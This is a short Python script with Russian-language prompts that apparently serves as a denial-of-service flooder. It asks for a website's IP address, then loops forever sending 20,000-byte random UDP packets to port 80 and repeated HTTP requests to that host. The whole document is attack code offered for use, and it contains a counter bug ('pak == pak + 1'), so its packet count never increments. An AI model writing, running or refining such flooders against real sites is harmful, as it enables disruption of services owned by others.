import socket
import random
import requests

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(20000)
ip = input("Айпи сайта: ")
pak = 1
def flood():
    while True:
        client.sendto(bytes, (ip, 80))
        response = requests.get(f"http://{ip}").text
        print(response)
        print(f"отправлен пакет {pak}")
        pak == pak + 1


flood()